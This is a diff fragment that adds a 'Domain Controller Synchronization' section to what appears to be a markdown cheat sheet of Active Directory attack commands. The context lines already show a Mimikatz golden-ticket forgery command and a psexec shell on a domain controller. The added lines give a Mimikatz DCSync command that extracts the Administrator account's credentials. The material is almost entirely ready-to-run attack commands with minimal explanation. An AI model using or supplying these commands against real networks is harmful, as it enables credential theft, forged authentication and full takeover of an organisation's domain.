@@ -183,3 +183,9 @@ kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-278752
 misc::cmd(launch a new command prompt)
 psexec.exe \\dc01 cmd.exe
 ```
+###### Domain Controller SynchronizationZ
+Require domain admin account
+```
+lsadump::dcsync /user:Administrator
+```
+
